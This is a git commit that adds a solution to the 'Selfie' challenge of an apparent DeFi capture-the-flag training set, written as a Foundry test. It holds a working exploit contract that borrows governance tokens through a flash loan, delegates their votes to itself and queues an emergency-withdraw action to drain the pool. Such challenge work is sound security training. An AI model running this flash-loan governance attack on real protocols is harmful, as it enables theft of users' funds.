1aad1c76615dd03294f189c1954b28efa79c7675
marvy-codes1 <marvedoo7@gmail.com>
2026-01-31 04:57:19 +0100

    solve no 6

--- test/selfie/Selfie.t.sol
+++ test/selfie/Selfie.t.sol
@@ -7,6 +7,11 @@ import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 
+// @audit-info import FlashBorrower
+import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -18,6 +23,9 @@ contract SelfieChallenge is Test {
     DamnValuableVotes token;
     SimpleGovernance governance;
     SelfiePool pool;
+
+    // @audit-info initialize exploit contract variable
+    SelfieExploit exploit;
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
@@ -62,7 +70,14 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        // new iterative idea
+        // 1 - flashloan for voting power
+        // 2 - propose an action with emergency withdraw as action 
+        exploit = new SelfieExploit(address(pool), address(recovery), address(governance), address(token));
+        exploit.exploit();
+        vm.warp(block.timestamp + 2 days);
+        governance.executeAction(exploit.getID());
+
     }
 
     /**
@@ -73,4 +88,62 @@ contract SelfieChallenge is Test {
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
+}
+
+
+contract SelfieExploit is IERC3156FlashBorrower {
+    SimpleGovernance governance;
+    SelfiePool pool;
+    address recovery;
+    DamnValuableVotes token;
+    uint256 ID;
+    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
+
+
+    constructor(
+        address _pool,
+        address _recovery,
+        address _governance,
+        address _token
+    ) {
+        pool = SelfiePool(_pool);
+        recovery = _recovery;
+        governance = SimpleGovernance(_governance);
+        token = DamnValuableVotes(_token);
+    }
+
+    function exploit() external {
+        pool.flashLoan(this, address(token), TOKENS_IN_POOL, "" );
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address tokenAddr,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata
+    ) external override returns (bytes32) {
+        // pool.deposit{value: msg.value}();
+        // idea create a vote with the flashloan
+        token.delegate(address(this));
+
+        bytes memory data = abi.encodeWithSelector(
+            pool.emergencyExit.selector,
+            recovery
+        );
+
+        ID = governance.queueAction(address(pool), 0, data);
+
+        IERC20(token).approve(address(pool), amount);
+
+        // 4️⃣ Return success value required by ERC3156
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+
+    function getID()  external view returns (uint256) {
+        return ID;
+    }
+
+    receive() external payable {}
 }
